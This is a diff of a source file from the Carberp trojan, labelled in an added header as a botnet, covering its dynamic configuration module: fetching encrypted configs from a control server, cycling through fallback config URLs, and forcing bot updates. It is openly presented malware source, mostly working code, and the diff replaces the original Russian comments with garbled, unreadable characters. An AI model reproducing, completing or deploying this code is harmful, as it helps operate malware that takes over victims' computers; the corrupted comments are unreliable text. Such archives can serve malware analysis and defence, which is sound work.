@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -45,7 +56,7 @@ BinStorage::STORAGE *DynamicConfig::getCurrent(void)
 {
   void *data;
   DWORD dataSize;
-  //Получем зашифрованные данные.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     DWORD type;
 
@@ -58,7 +69,7 @@ BinStorage::STORAGE *DynamicConfig::getCurrent(void)
     }
   }
   
-  //Получаем конфиг.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     PESETTINGS pes;
     Core::getPeSettings(&pes);
@@ -73,12 +84,12 @@ BinStorage::STORAGE *DynamicConfig::getCurrent(void)
 }
 
 /*
-  Загрузка обвнолвения бота, используя данные из текущей конфигурации.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN force - форсировать обновление бота, независимво от версии.
+  IN force - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return   - true - обновление успешно запущено,
-             false - произошла ошибка.
+  Return   - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+             false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool tryToUpdateBot(bool force)
 {
@@ -130,18 +141,18 @@ static bool tryToUpdateBot(bool force)
 
 enum
 {
-  UCF_FORCEUPDATE = 0x1, //форсировать обновление бота, независимво от версии.
+  UCF_FORCEUPDATE = 0x1, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 };
 
 /*
-  Обноволение концигурации и бота.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 
-  IN baseConfig - базовая конфигурация.
-  IN OUT md     - конфиг полученый от сервера. .
+  IN baseConfig - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT md     - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. .
   IN flags      -  UCF_*.
 
-  Return        - true - конфиг успешно орбновлен,
-                  false - не удалосб обнвоить конфиг.
+  Return        - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                  false - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool updateConfig(BASECONFIG *baseConfig, MEMDATA *md, DWORD flags)
 {
@@ -152,7 +163,7 @@ static bool updateConfig(BASECONFIG *baseConfig, MEMDATA *md, DWORD flags)
   {
     WDEBUG0(WDDT_INFO, "Configuration unpacked.");
     
-    //Обновляем конфигурацию.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       PESETTINGS pes;
       DWORD type;
@@ -204,14 +215,14 @@ bool DynamicConfig::download(LPSTR url)
   BASECONFIG baseConfig;
   LPSTR currentUrl = url == NULL ? baseConfig.defaultConfig : url;
   Core::getBaseConfig(&baseConfig);
-  //Настраиваем Wininet.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Wininet.
   Wininet::CALLURLDATA cud;
   Core::initDefaultCallUrlData(&cud);
   cud.hStopEvent               = coreData.globalHandles.stopEvent;
   cud.pstrURL                  = currentUrl;
   cud.DownloadData_dwSizeLimit = REGISTRY_MAX_VALUE_DATA_SIZE;
 
-  //Пытаемся загрузить стандартный конфиг.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   WDEBUG1(WDDT_INFO, "Trying download config \"%S\".", currentUrl);
   if(Wininet::_CallURL(&cud, &memData))
   {
@@ -219,7 +230,7 @@ bool DynamicConfig::download(LPSTR url)
     Mem::free(memData.data);
   }
   
-  //Если не был указан конкретный URL, входим в цикл по поиску запасных конфигов.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(ok == false && url == NULL)
   {
     WDEBUG0(WDDT_INFO, "Failed.");
@@ -237,10 +248,10 @@ bool DynamicConfig::download(LPSTR url)
         currentUrl = configUrlsList;
         do
         {
-          //Задержка между попытками.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 10000) != WAIT_TIMEOUT)break;
 
-          //Загрузка.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           WDEBUG1(WDDT_INFO, "Trying download \"%S\".", currentUrl);
           cud.pstrURL = currentUrl;
           if(Wininet::_CallURL(&cud, &memData))
@@ -278,7 +289,7 @@ static DWORD WINAPI proc(void *)
 
   WDEBUG0(WDDT_INFO, "Started.");
 
-  //Получем время ожидания.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   DWORD normalDelay;
   DWORD errorDelay;
   DWORD delay;
@@ -293,7 +304,7 @@ static DWORD WINAPI proc(void *)
     Mem::_zero(&baseConfig, sizeof(BASECONFIG));
   }
   
-  //Цикл.
+  //пїЅпїЅпїЅпїЅ.
   if(Core::isActive())
   {
     WDEBUG2(WDDT_INFO, "normalDelay=%u, errorDelay=%u", normalDelay, errorDelay);
